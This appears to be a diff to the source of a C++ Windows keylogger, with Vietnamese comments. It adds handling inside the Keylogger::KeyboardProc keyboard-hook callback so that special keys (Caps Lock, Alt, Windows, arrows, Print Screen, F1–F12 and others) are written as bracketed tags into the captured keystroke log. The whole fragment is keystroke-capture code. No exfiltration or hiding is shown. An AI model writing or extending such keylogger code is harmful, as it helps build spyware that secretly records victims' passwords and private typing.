@@ -103,6 +103,26 @@ LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
         else if ((key >= '0' && key <= '9') || (key >= 'A' && key <= 'Z')) {
              // Chuyển mã ASCII sang ký tự
              append(std::string(1, (char)key));
+        }else if (key == VK_CAPITAL) append("[CAPS]");
+        else if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU) append("[ALT]");
+        else if (key == VK_LWIN || key == VK_RWIN) append("[WIN]");
+        else if (key == VK_INSERT) append("[INS]");
+        else if (key == VK_DELETE) append("[DEL]");
+        else if (key == VK_PRIOR) append("[PGUP]");
+        else if (key == VK_NEXT) append("[PGDN]");
+        else if (key == VK_END) append("[END]");
+        else if (key == VK_HOME) append("[HOME]");
+        else if (key == VK_LEFT) append("[LEFT]");
+        else if (key == VK_UP) append("[UP]");
+        else if (key == VK_RIGHT) append("[RIGHT]");
+        else if (key == VK_DOWN) append("[DOWN]");
+        else if (key == VK_NUMLOCK) append("[NUMLOCK]");
+        else if (key == VK_SNAPSHOT) append("[PRINTSCREEN]");
+        else if (key == VK_SCROLL) append("[SCROLLLOCK]");
+        else if (key == VK_PAUSE) append("[PAUSE]");
+        // Xử lý dãy phím F1 - F12
+        else if (key >= VK_F1 && key <= VK_F12) {
+            append("[F" + std::to_string(key - VK_F1 + 1) + "]");
         }
         else {
              // Các phím lạ thì ghi mã số
